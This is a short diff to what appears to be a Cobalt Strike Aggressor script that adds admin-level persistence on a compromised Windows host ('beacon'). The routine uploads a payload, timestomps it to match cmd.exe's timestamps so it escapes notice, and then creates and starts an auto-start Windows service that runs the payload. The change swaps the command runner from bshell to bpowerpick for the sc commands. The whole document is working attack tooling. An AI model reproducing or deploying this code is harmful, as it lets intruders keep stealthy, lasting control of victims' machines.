@@ -13,10 +13,10 @@ sub persistCustomService  {
 			bcd($bid, $3['targetpath']);
 			bupload($bid, $3['payloadfile']);
 			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
-			bshell($bid, 'sc delete '.$3['servicename'].'');
-			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
-			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
-			bshell($bid, 'sc start '.$3['servicename'].'');
+			bpowerpick($bid, 'sc delete '.$3['servicename'].'');
+			bpowerpick($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
+			bpowerpick($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
+			bpowerpick($bid, 'sc start '.$3['servicename'].'');
 		}
 	}));
 	dialog_description($dialog, "Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**");
